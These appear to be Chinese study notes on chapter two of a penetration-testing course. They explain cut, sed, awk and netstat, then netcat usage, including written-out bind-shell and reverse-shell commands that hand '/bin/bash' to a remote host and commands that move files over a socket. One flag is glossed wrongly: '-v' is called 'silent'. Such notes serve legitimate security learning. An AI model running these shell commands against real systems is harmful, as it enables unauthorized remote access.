# 第二章

## 命令

### cut

`grep September myfile|cut -d " " -f 2` 意思就是在文件名为myfile的文件中找出带有"September"的条目，并且对这样的条目，以" "来分割成多分，取其中的第二份

### sed

`sed 's/Blackhat/Defcon/' myfile` 将myfile文件中的Blackhat都替换成Defcon

### awk

* `awk '$1 >5' myfile` 显示myfile中每一行第一个词大于5的行
* `awk '{print $1,$3;}' myfile` 显示myfile中每一行的第一个和第三个单词（应该是默认单词都以空格隔开）

### netstat

netstat -antp

## netcat

### 监听、连接发消息

`nc -lvp 1234`

* -l代表listen
* -v 代表verbose 静音
* -p代表port 指定端口

`nc 192.168.20.9 1234` 这样就连接上了这个端口 然后输入hi就可以发送一个hi给对方

### bind shell

server: nc -lvp 1234 -e /bin/bash client: nc 192.168.20.9 1234

### reverse shell

client: nc -lvp 1234 server: nc 192.168.20.9 1234 -e /bin/bash

### 将文件作为 输出或输入

nc -lvp 1234 &gt; netcatfile nc 192.168.20.9 1234 &lt; mydirectory/file

